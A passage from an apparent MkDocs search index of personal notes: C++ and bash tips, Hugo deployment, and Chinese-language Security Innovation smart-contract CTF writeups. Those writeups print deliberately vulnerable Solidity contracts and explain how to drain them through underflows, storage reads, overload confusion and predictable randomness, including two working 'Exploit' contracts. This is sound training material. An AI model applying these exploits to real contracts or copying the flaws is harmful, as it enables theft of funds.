... args);\n</code></pre> <p>\u63a5\u6536\u4e00\u4e2a\u53f3\u503c\u5f15\u7528\uff0c\u8c03\u7528\u5176\u79fb\u52a8\u6784\u9020\u51fd\u6570\uff0c\u5c06\u5bf9\u8c61\u79fb\u52a8\u5230\u5bb9\u5668\u4e2d\u3002</p> <p>\u5bf9\u6bd4push_back\uff1a\u8c03\u7528\u5bf9\u8c61\u62f7\u8d1d\u6784\u9020\u51fd\u6570\uff0c\u5bb9\u5668\u4e2d\u5b58\u50a8\u62f7\u8d1d\u540e\u7684\u526f\u672c\u3002</p>"}, {"location": "cs/languages/c%2B%2B/emplaceback/#stdmove", "title": "std::move", "text": "<p>\u7528\u4e8e\u5c06\u5de6\u503c\u8f6c\u5316\u4e3a\u53f3\u503c\u5f15\u7528\u7c7b\u578b\u3002</p>"}, {"location": "cs/tools/", "title": "\u5de5\u5177\u76f8\u5173", "text": "<p>Abstract</p> <p>\u4e00\u4e9b\u5de5\u5177\u7684\u7528\u6cd5\u8bb0\u5f55\uff0c\u4ee5\u53ca\u547d\u4ee4\u884c\u5de5\u5177\u7684\u5907\u5fd8\u547d\u4ee4</p>"}, {"location": "cs/tools/#_2", "title": "\u547d\u4ee4\u884c\u5de5\u5177", "text": "<ul> <li>Git \u547d\u4ee4\u5907\u5fd8</li> <li>Shell \u547d\u4ee4\u5907\u5fd8</li> <li>Docker \u76f8\u5173\u5907\u5fd8</li> <li>gdb \u76f8\u5173\u5907\u5fd8</li> </ul>"}, {"location": "cs/tools/#ci", "title": "CI \u5de5\u5177", "text": "<ul> <li>GitHub Action \u4f7f\u7528\u65b9\u6cd5\uff08TODO\uff09</li> </ul>"}, {"location": "cs/tools/#_3", "title": "\u7ad9\u70b9\u751f\u6210\u5de5\u5177", "text": "<ul> <li>mkdocs \u4f7f\u7528\u8bb0\u5f55</li> <li>hexo \u4f7f\u7528\u8bb0\u5f55</li> <li>sphinx \u4f7f\u7528\u8bb0\u5f55</li> </ul>"}, {"location": "cs/tools/bash/getopts/", "title": "getopts in Bash", "text": "<ul> <li>1. Notice</li> <li>2. Syntax</li> <li>3. Reference(s)</li> </ul>"}, {"location": "cs/tools/bash/getopts/#1-notice", "title": "1. Notice", "text": "<p>1.1 <code>getopts</code> is different from <code>getopt</code>. 1.2 <code>getopts</code> runs on any system running bash in POSIX mode (e.g., set -o posix), <code>getopt</code> is a system tool varies in different systems. 1.3 <code>getopts</code> parses short options, which are a single dash (\"-\") and a letter or digit.e.g. -2, -d, and -D. It can also parse short options in combination, for instance -2dD. But each option will be treated seperately, i.e. -2dD = -2 -d -D not equal -\"2dD\", will need <code>getopt</code> to cope with -\"2dD\".</p>"}, {"location": "cs/tools/bash/getopts/#2-syntax", "title": "2. Syntax", "text": "<p><pre><code>getopts optstring optname [ arg ]\n</code></pre> 2.1 Every time you run <code>getopts</code>, it looks for one of the options defined in <code>optstring</code>. If it finds one, it places the option letter in a variable named <code>optname</code>. If the option does not match those defined in <code>optstring</code>, <code>getopts</code> sets variable <code>optname</code> to a question mark (\"?\"), will need <code>\\?</code> in <code>switch ... case</code>.</p> <p>2.2 If the option is expecting an argument, <code>getopts</code> gets that argument, and places it in <code>$OPTARG</code>. If an expected argument is not found, the variable optname is set to a colon ( \":\" ). <code>Getopts</code> then increments the positional index, <code>$OPTIND</code>, that indicates the next option to be processed, don't need <code>\\:</code> in <code>switch ... case</code>.</p> <p>2.3 However, if you put a colon at the beginning of the <code>optstring</code>, <code>getopts</code> runs in \"silent error checking mode.\" It will not report any verbose errors about options or arguments, and you need to perform error checking in your script.</p> <p>2.4 In silent mode, if an option is unexpected, getopts sets <code>optname</code> to \"?\" and <code>$OPTARG</code> to the unknown option character.</p> <p>2.5 If the option is OK but an expected argument is not found, <code>optname</code> is set to a colon ( \":\" ) and <code>$OPTARG</code> is set to the unknown option character.</p> <p>2.6 <code>\\?</code> needs to appear before <code>:</code> in <code>switch ... case</code> for error checking, e.g.</p> <pre><code>while getopts \":hi:\" option; do\n  case \"$option\" in\n    h) \n      echo \"help function\"\n      ;;\n    i) \n      ilist=$OPTARG\n      ;;\n    \\?) \n      echo $option\n      echo \"Invalid option\"\n      ;;\n    :) \n      echo $option\n      echo \"no argument\"\n      ;;  \n  esac\ndone\n</code></pre> <p>2.7 The special option of two dashes (\"--\") is interpreted by getopts as the end of options.</p>"}, {"location": "cs/tools/bash/getopts/#3-references", "title": "3. Reference(s)", "text": "<p>\u201cBash Getopts Builtin Command Help and Examples.\u201d Help and Examples, 1 Feb. 2021, https://www.computerhope.com/unix/bash/getopts.htm. </p>"}, {"location": "cs/tools/website/hugo/", "title": "Hugo Site Auto Deployment with Github Action", "text": "<ul> <li>1-Background</li> <li>2-Steps</li> <li>3-Good to know</li> <li>Reference</li> </ul>"}, {"location": "cs/tools/website/hugo/#1-background", "title": "1-Background", "text": "<p>Trying to auto deploy Hugo blogs with Github Action. </p>"}, {"location": "cs/tools/website/hugo/#2-steps", "title": "2-Steps", "text": "<p>Most steps and tips have been covered by reference#1 and reference#2.</p>"}, {"location": "cs/tools/website/hugo/#3-good-to-know", "title": "3-Good to know", "text": "<p>Action will build from base url, could use this feature to create different sub domain under github.io. e.g. create a repo called <code>projects</code> to display different projects, this will be added to github.io/prjects</p> <p>If site deployment is automatically triggered by Github Action, need to notice the time difference between Github server and local time zone.</p>"}, {"location": "cs/tools/website/hugo/#reference", "title": "Reference", "text": "<p>1-https://gohugo.io/hosting-and-deployment/hosting-on-github/</p> <p>2-https://lucumt.info/post/hugo/using-github-action-to-auto-build-deploy/</p>"}, {"location": "writeups/", "title": "Writeups", "text": "<p>Abstract</p> <p>\u8fd9\u91cc\u4f1a\u5f52\u6863\u4e00\u4e9b\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u6bd4\u8d5b\u6216\u8005\u89e3\u5bc6\u6e38\u620f\u7684 writeup\u3002</p> <p>\u56e0\u4e3a\u6211\u76ee\u524d\u53ea\u4e3b\u653b misc \u65b9\u5411\uff0c\u6240\u4ee5\u8fd9\u91cc\u57fa\u672c\u90fd\u662f misc \u7684 writeup\uff08\u540e\u7eed\u53ef\u80fd\u4f1a\u52a0\u65b9\u5411\uff1f\uff09</p> <p>\u5176\u4e2d\u4e5f\u4f1a\u6709\u4e00\u4e9b\u6ca1\u505a\u51fa\u4f46\u662f\u6709\u4ef7\u503c\u7684\u9898\u76ee\u662f\u6839\u636e\u522b\u4eba/\u5b98\u65b9 writeup \u590d\u73b0\u800c\u6765\u7684</p>"}, {"location": "writeups/#table-of-contents", "title": "Table of Contents", "text": "Training          <ul> <li> Ethernaut  3724  1152  27 mins              1710906016 </li> <li> Security Innovation Smart Contract CTF  2053  852  17 mins              1710906016 </li> <li> SadServers (DevOps)  3875  719  22 mins              1710906016 </li> <li> \ud83d\udd12 AAA School Bus  0  0 mins              \u4e0d\u516c\u5f00 </li> </ul> 2023          <ul> <li> SECCON CTF 2022 Final  481  53  2 mins              1710906016 </li> <li> XCTF 2022 Final  508  29  2 mins              1710906016 </li> <li> Midnight Sun CTF 2023 Quals  150  20  1 mins              1710906016 </li> <li> AliyunCTF 2023  1662  344  10 mins              1710906016 </li> <li> CISCN 2023 Quals  1034  235  6 mins              1710906016 </li> <li> SECCON CTF 2023 Quals  812  133  4 mins              1710906016 </li> <li> TPCTF 2023  2149  398  12 mins              1710906016 </li> </ul> 2022          <ul> <li> VNCTF 2022  1220  230  7 mins              1710906016 </li> <li> TQLCTF 2022  1234  365  9 mins              1710906016 </li> <li> SUSCTF 2022  498  83  3 mins              1710906016 </li> <li> D^3CTF 2022  454  143  3 mins              1710906016 </li> <li> MRCTF 2022  930  424  8 mins              1710906016 </li> <li> \u5f3a\u7f51\u676f 2022 Quals  866  12  3 mins              1710906016 </li> <li> TCTF/0CTF 2022  2521  323  12 mins              1710906016 </li> <li> USTC Hackergame 2022  8639  182  31 mins              1710906016 </li> <li> N1CTF 2022  2685  838  19 mins              1710906016 </li> <li> SECCON CTF 2022 Quals  1722  111  7 mins              1710906016 </li> <li> RCTF 2022  423  29  2 mins              1710906016 </li> <li> *CTF 2022  0  0 mins              0 </li> </ul> 2021          <ul> <li> SYSU MSC Puzzle 2021  1955  181  9 mins              1710906016 </li> <li> USTC Hackergame 2021  9372  286  35 mins              1710906016 </li> <li> \u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b  406  81  2 mins              1710906016 </li> <li> ByteCTF 2021 Final  498  58  2 mins              1710906016 </li> <li> SCTF 2021  349  112  3 mins              1710906016 </li> </ul>"}, {"location": "writeups/SecurityInnovation/", "title": "Security Innovation Smart Contract CTF Writeups", "text": "<p> \u7ea6 2051 \u4e2a\u5b57  852 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 17 \u5206\u949f</p> <p>Abstract</p> <p>https://blockchain-ctf.securityinnovation.com/ \u4e0a\u7684\u4e00\u7cfb\u5217\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7c7b\u9898\u76ee\uff0c\u5165\u95e8 blockchain \u7684\u65f6\u5019\u505a\u7684\uff0c\u8fd9\u91cc\u8bb0\u4e0b\u505a\u9898\u8bb0\u5f55</p> <p>\u524d\u7f6e\u6b65\u9aa4\uff1a</p> <ul> <li>\u5b89\u88c5 MetaMask \u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u5e76\u521b\u5efa\u65b0\u8d26\u6237</li> <li>\u8fde\u63a5\u5230 Ropsten \u6d4b\u8bd5\u7f51\u7edc</li> <li>\u901a\u8fc7 https://faucet.metamask.io/ \u641e\u70b9\u6d4b\u8bd5\u5e01</li> <li>\u5728\u7f51\u7ad9\u4e0a\u8fde\u63a5 MetaMask\u3001\u90e8\u7f72\u9898\u76ee</li> </ul>"}, {"location": "writeups/SecurityInnovation/#donation", "title": "Donation", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract Donation is CtfFramework{\n    using SafeMath for uint256;\n\n    uint256 public funds;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        funds = funds.add(msg.value);\n    }\n\n    function() external payable ctf{\n        funds = funds.add(msg.value);\n    }\n\n    function withdrawDonationsFromTheSuckersWhoFellForIt() external ctf{\n        msg.sender.transfer(funds);\n        funds = 0;\n    }\n</code></pre> <p>\u76ee\u7684\u662f\u628a\u5408\u7ea6\u8d26\u6237\u641e\u6ca1\u94b1\uff0c\u6240\u4ee5\u5728 Remix \u4e2d\u7f16\u8bd1\u4e0b\u4ee3\u7801\uff0c\u7136\u540e\u4ece\u9898\u76ee\u90e8\u7f72\u7684\u5408\u7ea6\u5730\u5740\u8f7d\u5165\u5408\u7ea6\uff0c\u518d\u8c03\u7528 withdrawDonationsFromTheSuckersWhoFellForIt \u51fd\u6570\u5373\u53ef</p>"}, {"location": "writeups/SecurityInnovation/#lock-box", "title": "Lock Box", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract Lockbox1 is CtfFramework{\n    uint256 private pin;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        pin = now%10000;\n    }\n\n    function unlock(uint256 _pin) external ctf{\n        require(pin == _pin, \"Incorrect PIN\");\n        msg.sender.transfer(address(this).balance);\n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\uff0c\u9700\u8981\u8c03\u7528 unlock \u51fd\u6570\uff0c\u5b83\u9700\u8981\u63a5\u6536\u4e00\u4e2a\u6b63\u786e\u7684 pin\uff0c\u8fd9\u4e2a pin \u662f\u4ece\u521b\u5efa\u5408\u7ea6\u7684\u65f6\u95f4\u6233\u8ba1\u7b97\u6765\u7684\uff0c\u53ef\u4ee5\u5728\u94fe\u4e0a\u627e\u5230\u90e8\u7f72\u65f6\u95f4\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 web3 \u8bfb\u53d6\u5408\u7ea6 pin \u4f4d\u7f6e\u7684 storage \u4ece\u800c\u770b\u5230 pin \u5185\u5bb9\uff1a</p> <pre><code>&gt; await web3.eth.getStorageAt(\"0x56e06639308e17fd9d948ebaea5b2e4b4beef06e\", 1, (x,y)=&gt;{console.log(y);})\n0x0000000000000000000000000000000000000000000000000000000000000f73\n</code></pre> <p>\u7136\u540e\u540c\u6837\u5728 Remix \u4e0a\u7f16\u8bd1\u3001\u8f7d\u5165\u518d\u8c03\u7528 unlock \u51fd\u6570\u8f93\u5165\u6b63\u786e\u7684 pin \u5373\u53ef</p>"}, {"location": "writeups/SecurityInnovation/#piggy-bank", "title": "Piggy Bank", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract PiggyBank is CtfFramework{\n\n    using SafeMath for uint256;\n\n    uint256 public piggyBalance;\n    string public name;\n    address public owner;\n\n    constructor(address _ctfLauncher, address _player, string _name) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        name=_name;\n        owner=msg.sender;\n        piggyBalance=piggyBalance.add(msg.value);\n    }\n\n    function() external payable ctf{\n        piggyBalance=piggyBalance.add(msg.value);\n    }\n\n\n    modifier onlyOwner(){\n        require(msg.sender == owner, \"Unauthorized: Not Owner\");\n        _;\n    }\n\n    function withdraw(uint256 amount) internal{\n        piggyBalance = piggyBalance.sub(amount);\n        msg.sender.transfer(amount);\n    }\n\n    function collectFunds(uint256 amount) public onlyOwner ctf{\n        require(amount&lt;=piggyBalance, \"Insufficient Funds in Contract\");\n        withdraw(amount);\n    }\n\n}\n\n\ncontract CharliesPiggyBank is PiggyBank{\n\n    uint256 public withdrawlCount;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        PiggyBank(_ctfLauncher, _player, \"Charlie\") \n    {\n        withdrawlCount = 0;\n    }\n\n    function collectFunds(uint256 amount) public ctf{\n        require(amount&lt;=piggyBalance, \"Insufficient Funds in Contract\");\n        withdrawlCount = withdrawlCount.add(1);\n        withdraw(amount);\n    }\n\n}\n</code></pre> <p>withdraw \u662f internal\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0ccollectFunds \u662f public \u53ef\u4ee5\u8c03\u7528</p> <p>\u867d\u7136\u5728 PiggyBank \u5408\u7ea6\u4e2d\u52a0\u4e86 onlyOwner \u8fd9\u4e2a modifier\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u90e8\u7f72\u7684 CharliesPiggyBank \u5408\u7ea6\u91cd\u8f7d\u4e86\u8fd9\u4e2a\u51fd\u6570\u5e76\u6ca1\u6709\u5e26 modifier\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 collectFunds \u6765 withdraw \u9898\u76ee\u5408\u7ea6\u4e2d\u7684\u6240\u6709\u94b1</p>"}, {"location": "writeups/SecurityInnovation/#si-token-sale", "title": "SI Token Sale", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\n// https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.8.0/contracts/token/ERC20/StandardToken.sol\nimport \"../StandardToken.sol\";\n\ncontract SIToken is StandardToken {\n\n    using SafeMath for uint256;\n\n    string public name = \"SIToken\";\n    string public symbol = \"SIT\";\n    uint public decimals = 18;\n    uint public INITIAL_SUPPLY = 1000 * (10 ** decimals);\n\n    constructor() public{\n        totalSupply_ = INITIAL_SUPPLY;\n        balances[this] = INITIAL_SUPPLY;\n    }\n}\n\ncontract SITokenSale is SIToken, CtfFramework {\n\n    uint256 public feeAmount;\n    uint256 public etherCollection;\n    address public developer;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        feeAmount = 10 szabo; \n        developer = msg.sender;\n        purchaseTokens(msg.value);\n    }\n\n    function purchaseTokens(uint256 _value) internal{\n        require(_value &gt; 0, \"Cannot Purchase Zero Tokens\");\n        require(_value &lt; balances[this], \"Not Enough Tokens Available\");\n        balances[msg.sender] += _value - feeAmount;\n        balances[this] -= _value;\n        balances[developer] += feeAmount; \n        etherCollection += msg.value;\n    }\n\n    function () payable external ctf{\n        purchaseTokens(msg.value);\n    }\n\n    // Allow users to refund their tokens for half price ;-)\n    function refundTokens(uint256 _value) external ctf{\n        require(_value&gt;0, \"Cannot Refund Zero Tokens\");\n        transfer(this, _value);\n        etherCollection -= _value/2;\n        msg.sender.transfer(_value/2);\n    }\n\n    function withdrawEther() external ctf{\n        require(msg.sender == developer, \"Unauthorized: Not Developer\");\n        require(balances[this] == 0, \"Only Allowed Once Sale is Complete\");\n        msg.sender.transfer(etherCollection);\n    }\n\n}\n</code></pre> <p>\u53ef\u4ee5\u901a\u8fc7 refundTokens \u6765\u8f6c\u51fa\u4f59\u989d\uff0c\u4f46\u662f\u6700\u591a\u53ea\u80fd\u8f6c\u51fa balances \u7684\u4e00\u534a\uff0c\u6240\u4ee5\u8981\u5148\u63d0\u9ad8\u81ea\u5df1\u7684\u4ee3\u5e01\u4f59\u989d\u3002\u4e0d\u96be\u53d1\u73b0 purchaseTokens \u51fd\u6570\u4e2d\u5b58\u5728\u4e0b\u6ea2\uff1a <pre><code>balances[msg.sender] += _value - feeAmount;\n</code></pre> \u53ea\u8981\u4f20\u5165\u7684 _value \u5c0f\u4e8e feeAmount \u5c31\u53ef\u4ee5\u4f7f balances \u4e0b\u6ea2\u3002\u867d\u7136 purchaseTokens \u51fd\u6570\u662f internal \u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u4f46\u662f fallback \u51fd\u6570\u4e2d\u76f4\u63a5\u5c06 msg.value \u4f5c\u4e3a _value \u8c03\u7528\u4e86 purchaseTokens \u51fd\u6570\u3002\u56e0\u6b64\u53ef\u4ee5\u5148\u76f4\u63a5\u5411\u5408\u7ea6\u8d26\u6237\u8f6c 1Wei\uff0c\u5373\u53ef\u901a\u8fc7 fallback \u89e6\u53d1\u4e0b\u6ea2</p> <p>\u4e4b\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 refundTokens \u6765\u8f6c\u51fa\u4e86\u3002\u53ef\u4ee5\u5148\u8c03\u7528 etherCollection \u770b\u4e00\u4e0b\u9700\u8981\u8f6c\u51fa\u7684\u91d1\u989d\uff08\u4e5f\u53ef\u4ee5\u901a\u8fc7\u521d\u59cb + 1Wei \u7684\u65b9\u5f0f\u8ba1\u7b97\uff09\uff0c\u518d\u4e58\u4ee5\u4e8c\u5c31\u662f\u8981\u4f20\u7ed9 refundTokens \u7684\u53c2\u6570\u4e86</p>"}, {"location": "writeups/SecurityInnovation/#secure-bank", "title": "Secure Bank", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract SimpleBank is CtfFramework{\n\n    mapping(address =&gt; uint256) public balances;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        balances[msg.sender] = msg.value;\n    }\n\n    function deposit(address _user) public payable ctf{\n        balances[_user] += msg.value;\n    }\n\n    function withdraw(address _user, uint256 _value) public ctf{\n        require(_value&lt;=balances[_user], \"Insufficient Balance\");\n        balances[_user] -= _value;\n        msg.sender.transfer(_value);\n    }\n\n    function () public payable ctf{\n        deposit(msg.sender);\n    }\n\n}\n\ncontract MembersBank is SimpleBank{\n\n    mapping(address =&gt; string) public members;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        SimpleBank(_ctfLauncher, _player)\n    {\n    }\n\n    function register(address _user, string _username) public ctf{\n        members[_user] = _username;\n    }\n\n    modifier isMember(address _user){\n        bytes memory username = bytes(members[_user]);\n        require(username.length != 0, \"Member Must First Register\");\n        _;\n    }\n\n    function deposit(address _user) public payable isMember(_user) ctf{\n        super.deposit(_user);\n    }\n\n    function withdraw(address _user, uint256 _value) public isMember(_user) ctf{\n        super.withdraw(_user, _value);\n    }\n\n}\n\ncontract SecureBank is MembersBank{\n\n    constructor(address _ctfLauncher, address _player) public payable\n        MembersBank(_ctfLauncher, _player)\n    {\n    }\n\n    function deposit(address _user) public payable ctf{\n        require(msg.sender == _user, \"Unauthorized User\");\n        require(msg.value &lt; 100 ether, \"Exceeding Account Limits\");\n        require(msg.value &gt;= 1 ether, \"Does Not Satisfy Minimum Requirement\");\n        super.deposit(_user);\n    }\n\n    function withdraw(address _user, uint8 _value) public ctf{\n        require(msg.sender == _user, \"Unauthorized User\");\n        require(_value &lt; 100, \"Exceeding Account Limits\");\n        require(_value &gt;= 1, \"Does Not Satisfy Minimum Requirement\");\n        super.withdraw(_user, _value * 1 ether);\n    }\n\n    function register(address _user, string _username) public ctf{\n        require(bytes(_username).length!=0, \"Username Not Enough Characters\");\n        require(bytes(_username).length&lt;=20, \"Username Too Many Characters\");\n        super.register(_user, _username);\n    }\n}\n</code></pre> <p>\u5408\u7ea6\u6709\u70b9\u957f\uff0c\u6709\u4e09\u4e2a\u5408\u7ea6 SimpleBank\u3001MembersBank \u548c SecureBank\uff0c\u662f\u9010\u4e2a\u7ee7\u627f\u7684\u5173\u7cfb</p> <p>\u901a\u8fc7 SimpleBank \u7684 constructor \u53ef\u4ee5\u770b\u51fa\uff0c\u6240\u6709\u94b1\u90fd\u8f6c\u7ed9\u4e86\u9898\u76ee\u5408\u7ea6\u7684\u521b\u5efa\u8005\uff0c\u800c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7 etherscan \u67e5\u5230\uff0c\u6240\u4ee5\u76ee\u6807\u5c31\u662f\u8c03\u7528 withdraw \u51fd\u6570\u6765\u501f\u52a9\u521b\u5efa\u8005\u7684\u5730\u5740\u8f6c\u51fa\u5408\u7ea6\u4e2d\u7684\u94b1</p> <p>\u800c withdraw \u5b58\u5728\u4e86\u4e00\u4e9b\u95ee\u9898\uff1a</p> <ul> <li>SecureBank \u4e2d\u7684 withdraw \u68c0\u67e5\u4e86\u4f20\u5165\u7684 _user \u662f\u5426\u662f msg.sender\uff0c\u4e0d\u80fd\u4ece\u4e2d\u9020\u5047</li> <li>SecureBank \u7684 withdraw \u7684 _value \u53c2\u6570\u662f uint8 \u7c7b\u578b\uff0c\u800c MembersBank \u4e2d withdraw \u7684\u53c2\u6570\u662f uint256 \u7c7b\u578b\uff0c\u8fd9\u5bfc\u81f4\u4e86\u8fd9\u4e24\u4e2a\u51fd\u6570\u5e76\u4e0d\u662f\u91cd\u8f7d\u5173\u7cfb\uff0c\u800c\u662f\u4e24\u4e2a\u51fd\u6570</li> </ul> <p>\u6240\u4ee5\u73b0\u5728\u7684\u76ee\u6807\u662f\u8c03\u7528 MembersBank \u7684 withdraw \u51fd\u6570\u3002\u53ef\u4ee5\u53d1\u73b0\u5b83\u5e26\u6709\u4e00\u4e2a isMember(_user) \u7684 modifier\uff0c\u6240\u4ee5\u5148\u8981\u7ed9\u521b\u5efa\u8005\u7684\u5730\u5740 register \u4e00\u4e0b\uff0c\u7136\u540e\u518d\u8c03\u7528 withdraw(address, uint256) \u8f6c\u51fa\u6240\u6709\u4f59\u989d\u5373\u53ef</p>"}, {"location": "writeups/SecurityInnovation/#lottery", "title": "Lottery", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract Lottery is CtfFramework{\n\n    using SafeMath for uint256;\n\n    uint256 public totalPot;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        totalPot = totalPot.add(msg.value);\n    }\n\n    function() external payable ctf{\n        totalPot = totalPot.add(msg.value);\n    }\n\n    function play(uint256 _seed) external payable ctf{\n        require(msg.value &gt;= 1 finney, \"Insufficient Transaction Value\");\n        totalPot = totalPot.add(msg.value);\n        bytes32 entropy = blockhash(block.number);\n        bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));\n        bytes32 target = keccak256(abi.encodePacked(entropy^entropy2));\n        bytes32 guess = keccak256(abi.encodePacked(_seed));\n        if(guess==target){\n            //winner\n            uint256 payout = totalPot;\n            totalPot = 0;\n            msg.sender.transfer(payout);\n        }\n    }    \n}\n</code></pre> <p>\u9884\u6d4b\u4f2a\u968f\u673a\u6570\uff0c\u53ea\u9700\u8981\u7f16\u5199\u4e00\u4e2a\u65b0\u7684\u5408\u7ea6\u7136\u540e\u6839\u636e play \u91cc\u7684\u903b\u8f91\u751f\u6210 target\uff0c\u7136\u540e\u4f20\u7ed9 play \u5373\u53ef</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\u8981\u652f\u4ed8 1 finney \u4f5c\u4e3a value\uff0c\u5e76\u4e14\u5728\u90e8\u7f72\u5408\u7ea6\u4e4b\u540e\u8981\u5148\u8c03\u7528\u4e00\u4e0b Lottery \u7684 ctf_challenge_add_authorized_sender \u51fd\u6570\uff08\u6765\u81ea CtfFramework\uff09\u5c06\u5408\u7ea6\u5730\u5740\u52a0\u5165\u767d\u540d\u5355</p> exp <pre><code>contract Exploit {\n    Lottery challenge;\n    constructor(address addr) public {\n        challenge = Lottery(addr);\n    }\n    function exp() public payable {\n        bytes32 entropy = blockhash(block.number);\n        bytes32 entropy2 = keccak256(abi.encodePacked(this));\n        uint256 ans = uint256(entropy ^ entropy2);\n        challenge.play.value(msg.value)(ans);\n    }\n    function() public payable {}\n    function destroy(address addr) public {\n        selfdestruct(addr);\n    }\n}\n</code></pre>"}, {"location": "writeups/SecurityInnovation/#heads-or-tails", "title": "Heads or Tails", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract HeadsOrTails is CtfFramework{\n\n    using SafeMath for uint256;\n\n    uint256 public gameFunds;\n    uint256 public cost;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        gameFunds = gameFunds.add(msg.value);\n        cost = gameFunds.div(10);\n    }\n\n    function play(bool _heads) external payable ctf{\n        require(msg.value == cost, \"Incorrect Transaction Value\");\n        require(gameFunds &gt;= cost.div(2), \"Insufficient Funds in Game Contract\");\n        bytes32 entropy = blockhash(block.number-1);\n        bytes1 coinFlip = entropy[0] &amp; 1;\n        if ((coinFlip == 1 &amp;&amp; _heads) || (coinFlip == 0 &amp;&amp; !_heads)) {\n            //win\n            gameFunds = gameFunds.sub(msg.value.div(2));\n            msg.sender.transfer(msg.value.mul(3).div(2));\n        }\n        else {\n            //loser\n            gameFunds = gameFunds.add(msg.value);\n        }\n    }\n\n}\n</code></pre> <p>\u540c\u6837\u662f\u8ba1\u7b97\u4f2a\u968f\u673a\u6570\uff0c\u6bcf\u6b21 play \u9700\u8981 0.1 ether\uff0c\u5e76\u4e14\u4ece\u9898\u76ee\u5408\u7ea6\u8d26\u6237\u4e2d\u8f6c\u51fa 0.05 ether \u4f5c\u4e3a\u5956\u52b1\u3002\u56e0\u6b64\u9700\u8981\u8c03\u7528 20 \u6b21 play \u6765\u8f6c\u51fa\u8d26\u6237\u4e2d\u7684 2 ether</p> <p>\u540c\u6837\u9700\u8981\u5728\u90e8\u7f72\u5408\u7ea6\u540e\u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 ctf_challenge_add_authorized_sender \u51fd\u6570\u6765\u5c06\u653b\u51fb\u5408\u7ea6\u5730\u5740\u52a0\u5165\u767d\u540d\u5355\u3002\u5e76\u4e14\u505a\u5b8c\u4e4b\u540e selfdestruct \u6765\u8f6c\u56de\u653b\u51fb\u5408\u7ea6\u4e2d\u7684 3 ether \u4f1a\u6bd4\u8f83\u597d</p> exp <pre><code>contract Exploit {\n    HeadsOrTails challenge;\n    constructor(address addr) public {\n        challenge = HeadsOrTails(addr);\n    }\n    function exp() public payable {\n        bytes32 entropy = blockhash(block.number - 1);\n        bytes1 coinFlip = entropy[0] &amp; 1;\n        for (int i = 0; i &lt; 20; i++) {\n            if (coinFlip == 1) {\n                challenge.play.value(0.1 ether)(true);\n            } else {\n                challenge.play.value(0.1 ether)(false);\n            }\n        }\n    }\n    function() public payable {}\n    function destroy(address addr) public {\n        selfdestruct(addr);\n    }\n}\n</code></pre>"}, {"location": "writeups/SecurityInnovation/#trust-fund", "title": "Trust Fund", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract TrustFund is CtfFramework{\n\n    using SafeMath for uint256;\n\n    uint256 public allowancePerYear;\n    uint256 public startDate;\n    uint256 public numberOfWithdrawls;\n    bool public withdrewThisYear;\n    address public custodian;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        custodian = msg.sender;\n        allowancePerYear = msg.value.div(10);        \n        startDate = now;\n    }\n\n    function checkIfYearHasPassed() internal{\n        if (now&gt;=startDate + numberOfWithdrawls * 365 days){\n            withdrewThisYear = false;\n        } \n    }\n\n    function withdraw() external ctf{\n        require(allowancePerYear &gt; 0, \"No Allowances Allowed\");\n        checkIfYearHasPassed();\n        require(!withdrewThisYear, \"Already Withdrew This Year\");\n        